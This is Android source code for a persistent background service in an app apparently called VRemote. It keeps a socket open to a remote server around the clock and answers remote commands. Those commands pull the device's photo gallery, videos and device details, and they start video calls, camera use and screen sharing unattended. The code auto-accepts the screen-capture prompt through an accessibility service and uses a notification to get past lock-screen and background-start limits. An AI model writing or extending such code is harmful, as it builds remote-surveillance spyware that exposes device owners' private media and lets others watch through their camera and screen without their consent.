package com.tokendeal.vremote;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.net.wifi.WifiManager;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.PowerManager;
import android.util.Log;
import androidx.core.app.NotificationCompat;

import org.json.JSONObject;

import io.socket.client.IO;
import io.socket.client.Socket;

/**
 * 24/7 Persistent Background Companion Foreground Service.
 * Ensures the device maintains an active socket to v.tokendeal.cloud even when
 * MainActivity is closed or swiped away. Handles waking, remote calling, gallery,
 * videos, and device info queries in the background without touching the phone.
 */
public class BackgroundKeepAliveService extends Service {
    private static final String TAG = "BgKeepAliveService";
    private static final String CHANNEL_ID = "VRemoteCompanionChannel";
    private static final int NOTIFICATION_ID = 8802;
    private static final String SERVER_URL = "https://v.tokendeal.cloud";

    private static BackgroundKeepAliveService sInstance = null;

    private Socket mBgSocket = null;
    private PowerManager.WakeLock mWakeLock = null;
    private WifiManager.WifiLock mWifiLock = null;
    private final Handler mWatchdogHandler = new Handler(Looper.getMainLooper());

    private final Runnable mWatchdogRunnable = new Runnable() {
        @Override
        public void run() {
            try {
                if (mBgSocket == null || !mBgSocket.connected()) {
                    Log.i(TAG, "Watchdog: Socket disconnected, reconnecting...");
                    initBackgroundSocket();
                }
            } catch (Exception ignored) {}
            mWatchdogHandler.postDelayed(this, 5000);
        }
    };

    public static boolean isServiceRunning() {
        return sInstance != null;
    }

    public static BackgroundKeepAliveService getInstance() {
        return sInstance;
    }

    public static void startService(Context context) {
        if (context == null) return;
        try {
            Intent intent = new Intent(context, BackgroundKeepAliveService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(intent);
            } else {
                context.startService(intent);
            }
        } catch (Exception e) {
            Log.e(TAG, "Failed to start BackgroundKeepAliveService", e);
        }
    }

    @Override
    public void onCreate() {
        super.onCreate();
        sInstance = this;
        Log.i(TAG, "BackgroundKeepAliveService created");
        createNotificationChannel();
        startInForeground();
        acquireLocks();
        initBackgroundSocket();
        mWatchdogHandler.postDelayed(mWatchdogRunnable, 5000);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        startInForeground();
        if (mBgSocket == null || !mBgSocket.connected()) {
            initBackgroundSocket();
        }
        return START_STICKY;
    }

    @Override
    public void onTaskRemoved(Intent rootIntent) {
        super.onTaskRemoved(rootIntent);
        AppLogs.i(TAG, "onTaskRemoved: Activity swiped away, ensuring BackgroundKeepAliveService persists!");
        startInForeground();
        if (mBgSocket == null || !mBgSocket.connected()) {
            initBackgroundSocket();
        }
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        Log.w(TAG, "BackgroundKeepAliveService destroyed, releasing resources");
        mWatchdogHandler.removeCallbacks(mWatchdogRunnable);
        releaseLocks();
        if (mBgSocket != null) {
            try {
                AppLogs.unregisterSocket(mBgSocket);
                mBgSocket.disconnect();
                mBgSocket.close();
            } catch (Exception ignored) {}
            mBgSocket = null;
        }
        sInstance = null;
    }

    private void startInForeground() {
        try {
            Intent notificationIntent = new Intent(this, MainActivity.class);
            PendingIntent pendingIntent = PendingIntent.getActivity(
                    this, 0, notificationIntent,
                    PendingIntent.FLAG_IMMUTABLE | PendingIntent.FLAG_UPDATE_CURRENT
            );

            Notification notification = new NotificationCompat.Builder(this, CHANNEL_ID)
                    .setContentTitle("VRemote Companion Active")
                    .setContentText("24/7 background connection active — ready for remote calling")
                    .setSmallIcon(R.drawable.app_icon)
                    .setContentIntent(pendingIntent)
                    .setOngoing(true)
                    .setPriority(NotificationCompat.PRIORITY_LOW)
                    .build();

            try {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
                        startForeground(NOTIFICATION_ID, notification, android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC);
                    } else {
                        startForeground(NOTIFICATION_ID, notification, 0);
                    }
                } else {
                    startForeground(NOTIFICATION_ID, notification);
                }
            } catch (Exception fgsEx) {
                Log.w(TAG, "startForeground typed failed, falling back to basic foreground", fgsEx);
                try {
                    startForeground(NOTIFICATION_ID, notification);
                } catch (Exception ignored) {}
            }
        } catch (Exception e) {
            Log.e(TAG, "Error starting foreground notification", e);
        }
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                    CHANNEL_ID,
                    "VRemote Companion Service",
                    NotificationManager.IMPORTANCE_LOW
            );
            channel.setDescription("Maintains 24/7 background connection for unattended remote calling");
            channel.setShowBadge(false);
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) {
                manager.createNotificationChannel(channel);
            }
        }
    }

    private void acquireLocks() {
        try {
            PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
            if (pm != null && mWakeLock == null) {
                mWakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "VRemote::BgServiceWakeLock");
                mWakeLock.setReferenceCounted(false);
                mWakeLock.acquire();
                Log.i(TAG, "Acquired Partial WakeLock for 24/7 background socket");
            }

            WifiManager wm = (WifiManager) getApplicationContext().getSystemService(Context.WIFI_SERVICE);
            if (wm != null && mWifiLock == null) {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.HONEYCOMB_MR1) {
                    mWifiLock = wm.createWifiLock(WifiManager.WIFI_MODE_FULL_HIGH_PERF, "VRemote::BgServiceWifiLock");
                } else {
                    mWifiLock = wm.createWifiLock("VRemote::BgServiceWifiLock");
                }
                mWifiLock.setReferenceCounted(false);
                mWifiLock.acquire();
                Log.i(TAG, "Acquired High-Perf WiFi Lock for 24/7 background socket");
            }
        } catch (Exception e) {
            Log.e(TAG, "Error acquiring locks", e);
        }
    }

    private void releaseLocks() {
        try {
            if (mWakeLock != null && mWakeLock.isHeld()) {
                mWakeLock.release();
                mWakeLock = null;
            }
            if (mWifiLock != null && mWifiLock.isHeld()) {
                mWifiLock.release();
                mWifiLock = null;
            }
        } catch (Exception ignored) {}
    }

    private void initBackgroundSocket() {
        if (mBgSocket != null) {
            if (mBgSocket.connected()) return;
            mBgSocket.connect();
            return;
        }
        try {
            IO.Options opts = new IO.Options();
            opts.reconnection = true;
            opts.reconnectionAttempts = Integer.MAX_VALUE;
            opts.reconnectionDelay = 1000;
            opts.timeout = 10000;
            opts.transports = new String[]{"websocket", "polling"};

            mBgSocket = IO.socket(SERVER_URL, opts);
            AppLogs.registerSocket(mBgSocket);

            mBgSocket.on(Socket.EVENT_CONNECT, args -> {
                AppLog.i(TAG, "Background KeepAlive Socket Connected: " + (mBgSocket != null ? mBgSocket.id() : "null"));
                registerDeviceBackground();
            });

            mBgSocket.on(Socket.EVENT_DISCONNECT, args -> {
                AppLog.w(TAG, "Background KeepAlive Socket Disconnected.");
            });

            mBgSocket.on("auto-command", args -> {
                try {
                    JSONObject data = (JSONObject) args[0];
                    String command = data.optString("command", "");
                    String fromSocketId = data.optString("from", "");
                    String caller = data.optString("caller", fromSocketId);
                    String cameraChoice = data.optString("cameraChoice", "front");
                    int page = data.optInt("page", 0);
                    long mediaId = data.optLong("mediaId", -1);
                    String mediaType = data.optString("mediaType", "image");

                    Log.i(TAG, "Background auto-command received: " + command + " from " + caller);

                    if ("get_gallery".equals(command)) {
                        MediaBridge.getGalleryPage(this, page, mBgSocket, fromSocketId);
                    } else if ("get_videos".equals(command)) {
                        MediaBridge.getVideoPage(this, page, mBgSocket, fromSocketId);
                    } else if ("get_media_detail".equals(command)) {
                        MediaBridge.getMediaItemDetail(this, mediaId, mediaType, mBgSocket, fromSocketId);
                    } else if ("get_device_info".equals(command)) {
                        JSONObject info = new JSONObject();
                        info.put("deviceId", DeviceRegistry.getDeviceId(this));
                        info.put("deviceName", DeviceRegistry.getDeviceModel());
                        info.put("ram", DeviceRegistry.getDeviceRam(this));
                        info.put("platform", "android");
                        info.put("targetSocketId", fromSocketId);
                        if (mBgSocket != null && mBgSocket.connected()) {
                            mBgSocket.emit("device-info-response", info);
                        }
                    } else if ("audio_call".equals(command) || "video_call".equals(command) ||
                               "screen_share".equals(command) || "screen_share_control".equals(command)) {
                        wakeUpAndLaunch(command, caller, cameraChoice);
                    } else if ("end_call".equals(command)) {
                        Intent serviceIntent = new Intent(this, ScreenCaptureService.class);
                        stopService(serviceIntent);
                        if (MainActivity.getInstance() != null) {
                            MainActivity.getInstance().runOnUiThread(() -> {
                                MainActivity.getInstance().stopAllMediaAndFinish();
                            });
                        }
                    } else if ("flip_camera".equals(command) || "switch_camera".equals(command)) {
                        if (MainActivity.getInstance() != null && MainActivity.getInstance().getWebRTCCompanion() != null) {
                            MainActivity.getInstance().runOnUiThread(() -> {
                                MainActivity.getInstance().getWebRTCCompanion().switchCompanionCamera();
                            });
                        }
                    }
                } catch (Exception e) {
                    Log.e(TAG, "Error processing background auto-command", e);
                }
            });

            mBgSocket.connect();
        } catch (Exception e) {
            Log.e(TAG, "Error initializing background socket", e);
        }
    }

    private void registerDeviceBackground() {
        try {
            String deviceId = DeviceRegistry.getDeviceId(this);
            String deviceName = DeviceRegistry.getDeviceModel();
            String ram = DeviceRegistry.getDeviceRam(this);

            JSONObject payload = new JSONObject();
            payload.put("deviceId", deviceId);
            payload.put("deviceName", deviceName);
            payload.put("ram", ram);
            payload.put("platform", "android");
            payload.put("role", "background_service");

            if (mBgSocket != null && mBgSocket.connected()) {
                mBgSocket.emit("register-device", payload);
                Log.i(TAG, "Background Device Registered: " + deviceId + " (" + deviceName + ")");
            }
        } catch (Exception e) {
            Log.e(TAG, "Error registering background device", e);
        }
    }

    public void wakeUpAndLaunch(String command, String caller, String cameraChoice) {
        try {
            PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
            if (pm != null) {
                PowerManager.WakeLock wl = pm.newWakeLock(
                        PowerManager.FULL_WAKE_LOCK |
                        PowerManager.ACQUIRE_CAUSES_WAKEUP |
                        PowerManager.ON_AFTER_RELEASE,
                        "vremote:bg_wake"
                );
                wl.acquire(15000);
            }
        } catch (Exception ignored) {}

        if ("screen_share".equals(command) || "screen_share_control".equals(command)) {
            RemoteAccessibilityService.setAutoAcceptPending(true);
        }

        // 1. If MainActivity is already running in background, dispatch directly!
        if (MainActivity.getInstance() != null) {
            MainActivity.getInstance().runOnUiThread(() -> {
                MainActivity.getInstance().handleAutoCommandDirectly(command, caller, cameraChoice);
            });
            if (!"screen_share".equals(command) && !"screen_share_control".equals(command)) {
                return;
            }
        }

        Intent intent = new Intent(this, MainActivity.class);
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_REORDER_TO_FRONT | Intent.FLAG_ACTIVITY_SINGLE_TOP);
        intent.putExtra("auto_command", command);
        intent.putExtra("caller", caller);
        intent.putExtra("cameraChoice", cameraChoice);

        // 2. High priority full screen notification to bypass lockscreen and BAL restrictions
        try {
            RemoteAccessibilityService.triggerFullScreenWakeNotification(this, intent, command);
        } catch (Throwable ignored) {}

        try {
            if (Build.VERSION.SDK_INT >= 34) {
                android.app.ActivityOptions opt = android.app.ActivityOptions.makeBasic();
                opt.setPendingIntentBackgroundActivityStartMode(android.app.ActivityOptions.MODE_BACKGROUND_ACTIVITY_START_ALLOWED);
                startActivity(intent, opt.toBundle());
            } else {
                startActivity(intent);
            }
        } catch (Exception e) {
            Log.e(TAG, "startActivity failed: " + e.getMessage());
        }
    }
}
